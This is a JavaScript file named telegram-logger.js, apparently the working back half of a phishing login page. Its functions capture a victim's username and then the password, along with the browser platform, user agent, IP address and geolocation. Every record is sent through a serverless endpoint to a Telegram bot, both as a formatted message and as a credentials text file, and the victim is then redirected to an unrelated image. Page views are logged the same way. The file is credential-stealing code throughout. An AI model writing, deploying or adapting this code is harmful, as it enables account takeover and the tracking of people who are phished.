// telegram-logger.js
// Track if we've already sent page notification
let pageViewNotified = false;

// API endpoint (your Vercel deployment URL)
const API_URL = '/api/telegram'; // This will work locally and on Vercel

// Function to send message via Vercel API
async function sendToTelegram(message, parseMode = 'HTML') {
    try {
        console.log('Sending to Telegram via API...');
        
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: message.substring(0, 4000),
                parse_mode: parseMode
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            console.log('Message sent to Telegram successfully');
            return true;
        } else {
            console.error('Failed to send to Telegram:', data.error);
            return false;
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Function to send document via Vercel API
async function sendDocumentToTelegram(fileContent, fileName, caption = '') {
    try {
        console.log('Sending document to Telegram via API...');
        
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                document: fileContent,
                fileName: fileName,
                caption: caption.substring(0, 1024)
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            console.log('Document sent successfully');
            return true;
        } else {
            console.error('Failed to send document:', data.error);
            return false;
        }
    } catch (error) {
        console.error('Error sending document:', error);
        return false;
    }
}

// Function to get device info
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// Function to get IP location
async function getIPLocation() {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
        clearTimeout(timeoutId);
        
        if (response.ok) {
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                countryCode: data.country_code,
                postal: data.postal,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timezone,
                org: data.org
            };
        }
        return null;
    } catch (error) {
        console.error('IP location error:', error);
        return null;
    }
}

// Function to redirect to image after second log
function redirectToImage() {
    const redirectUrl = 'https://i.ibb.co/k2Z5tx1X/CS1-1.jpg';
    console.log('Redirecting to:', redirectUrl);
    window.location.href = redirectUrl;
}

// Function to log FIRST log (Username only)
async function logFirstLog(username, step = 'username_input') {
    console.log('logFirstLog called for:', username);
    
    const timestamp = new Date().toLocaleString();
    const deviceInfo = getDeviceInfo();
    const ipLocation = await getIPLocation();
    
    let message = `📧 <b>FIRST LOG - USERNAME CAPTURED</b>\n\n`;
    message += `👤 <b>Username:</b> <code>${username}</code>\n`;
    message += `📱 <b>Step:</b> ${step}\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n\n`;
    
    message += `💻 <b>Device Information</b>\n`;
    message += `🖥️ <b>Platform:</b> ${deviceInfo.platform}\n`;
    message += `🌍 <b>Timezone:</b> ${deviceInfo.timezone}\n`;
    message += `🌐 <b>Language:</b> ${deviceInfo.language}\n`;
    message += `📱 <b>User Agent:</b> ${deviceInfo.userAgent.substring(0, 150)}...\n\n`;
    
    if (ipLocation && ipLocation.ip) {
        message += `🌍 <b>Location Information</b>\n`;
        message += `🔗 <b>IP:</b> <code>${ipLocation.ip}</code>\n`;
        if (ipLocation.city) message += `🏙️ <b>City:</b> ${ipLocation.city}\n`;
        if (ipLocation.region) message += `🗺️ <b>Region:</b> ${ipLocation.region}\n`;
        if (ipLocation.country) message += `🏳️ <b>Country:</b> ${ipLocation.country}\n`;
        if (ipLocation.postal) message += `📮 <b>Postal:</b> ${ipLocation.postal}\n`;
        if (ipLocation.org) message += `🏢 <b>ISP:</b> ${ipLocation.org}`;
    }
    
    const result = await sendToTelegram(message);
    console.log('First log send result:', result);
}

// Function to log SECOND log (Username + Password together)
async function logSecondLog(username, password, step = 'full_credentials') {
    console.log('logSecondLog called for:', username);
    
    const timestamp = new Date().toLocaleString();
    const deviceInfo = getDeviceInfo();
    const ipLocation = await getIPLocation();
    
    let message = `🔐 <b>SECOND LOG - FULL CREDENTIALS</b>\n\n`;
    message += `👤 <b>Username:</b> <code>${username}</code>\n`;
    message += `🔐 <b>Password:</b> <code>${password}</code>\n`;
    message += `📱 <b>Step:</b> ${step}\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n\n`;
    
    message += `💻 <b>Device Information</b>\n`;
    message += `🖥️ <b>Platform:</b> ${deviceInfo.platform}\n`;
    message += `🌍 <b>Timezone:</b> ${deviceInfo.timezone}\n`;
    message += `🌐 <b>Language:</b> ${deviceInfo.language}\n`;
    message += `📱 <b>User Agent:</b> ${deviceInfo.userAgent.substring(0, 150)}...\n\n`;
    
    if (ipLocation && ipLocation.ip) {
        message += `🌍 <b>Location Information</b>\n`;
        message += `🔗 <b>IP:</b> <code>${ipLocation.ip}</code>\n`;
        if (ipLocation.city) message += `🏙️ <b>City:</b> ${ipLocation.city}\n`;
        if (ipLocation.region) message += `🗺️ <b>Region:</b> ${ipLocation.region}\n`;
        if (ipLocation.country) message += `🏳️ <b>Country:</b> ${ipLocation.country}\n`;
        if (ipLocation.postal) message += `📮 <b>Postal:</b> ${ipLocation.postal}\n`;
        if (ipLocation.org) message += `🏢 <b>ISP:</b> ${ipLocation.org}`;
    }
    
    message += `\n\n<b>📋 FULL CREDENTIALS:</b>\n`;
    message += `<code>${username}</code>\n`;
    message += `<code>${password}</code>`;
    
    const result = await sendToTelegram(message);
    console.log('Second log send result:', result);
    
    // Also send as file
    let fileContent = `🔐 FULL CREDENTIALS CAPTURED\n`;
    fileContent += `═══════════════════════════════════\n\n`;
    fileContent += `👤 USERNAME: ${username}\n`;
    fileContent += `🔐 PASSWORD: ${password}\n\n`;
    fileContent += `⏰ Time: ${timestamp}\n`;
    fileContent += `🖥️ Platform: ${deviceInfo.platform}\n`;
    fileContent += `🌍 Timezone: ${deviceInfo.timezone}\n`;
    fileContent += `📱 User Agent: ${deviceInfo.userAgent}\n`;
    
    if (ipLocation && ipLocation.ip) {
        fileContent += `\n📍 IP: ${ipLocation.ip}\n`;
        if (ipLocation.city) fileContent += `📍 City: ${ipLocation.city}\n`;
        if (ipLocation.country) fileContent += `📍 Country: ${ipLocation.country}`;
    }
    
    const fileTimestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const fileName = `credentials_${fileTimestamp}.txt`;
    await sendDocumentToTelegram(fileContent, fileName, `🔐 Credentials for ${username}`);
    
    // REDIRECT AFTER SECOND LOG
    console.log('Second log sent, redirecting...');
    setTimeout(() => {
        redirectToImage();
    }, 500);
}

// Function to notify page view
async function notifyPageView(pageName = 'Login Page') {
    if (pageViewNotified) return;
    pageViewNotified = true;
    
    console.log('Sending page view notification');
    
    const timestamp = new Date().toLocaleString();
    const deviceInfo = getDeviceInfo();
    const ipLocation = await getIPLocation();
    
    let message = `👁️ <b>PAGE VIEW DETECTED</b>\n\n`;
    message += `📄 <b>Page:</b> ${pageName}\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n\n`;
    
    message += `💻 <b>Device Information</b>\n`;
    message += `🖥️ <b>Platform:</b> ${deviceInfo.platform}\n`;
    message += `🌍 <b>Timezone:</b> ${deviceInfo.timezone}\n`;
    message += `🌐 <b>Language:</b> ${deviceInfo.language}\n`;
    message += `📱 <b>User Agent:</b> ${deviceInfo.userAgent.substring(0, 150)}...\n\n`;
    
    if (ipLocation && ipLocation.ip) {
        message += `🌍 <b>Location Information</b>\n`;
        message += `🔗 <b>IP:</b> <code>${ipLocation.ip}</code>\n`;
        if (ipLocation.city) message += `🏙️ <b>City:</b> ${ipLocation.city}\n`;
        if (ipLocation.region) message += `🗺️ <b>Region:</b> ${ipLocation.region}\n`;
        if (ipLocation.country) message += `🏳️ <b>Country:</b> ${ipLocation.country}`;
    }
    
    await sendToTelegram(message);
}

// Export functions for use in HTML
window.TelegramLogger = {
    sendToTelegram,
    sendDocumentToTelegram,
    logFirstLog,
    logSecondLog,
    notifyPageView,
    getDeviceInfo,
    getIPLocation,
    redirectToImage
};

console.log('Telegram Logger loaded - Using Vercel API backend');